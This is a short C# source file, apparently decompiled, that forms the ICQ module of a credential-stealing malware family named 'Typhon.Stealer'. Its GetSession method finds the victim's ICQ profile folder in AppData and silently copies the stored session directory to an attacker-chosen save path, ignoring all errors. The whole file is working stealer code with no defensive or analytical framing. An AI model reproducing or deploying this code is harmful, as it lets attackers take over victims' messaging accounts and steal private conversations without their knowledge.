using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000017 RID: 23
	internal class ICQ
	{
		// Token: 0x06000066 RID: 102 RVA: 0x00004CEC File Offset: 0x00002EEC
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(ICQ.ICQPath))
			{
				return;
			}
			string text = Path.Combine(ICQ.ICQPath, "0001");
			if (Directory.Exists(text))
			{
				try
				{
					IOHelper.CopyDirectory(text, sSavePath + "\\0001");
				}
				catch
				{
				}
			}
		}

		// Token: 0x04000038 RID: 56
		private static readonly string ICQPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ICQ");
	}
}
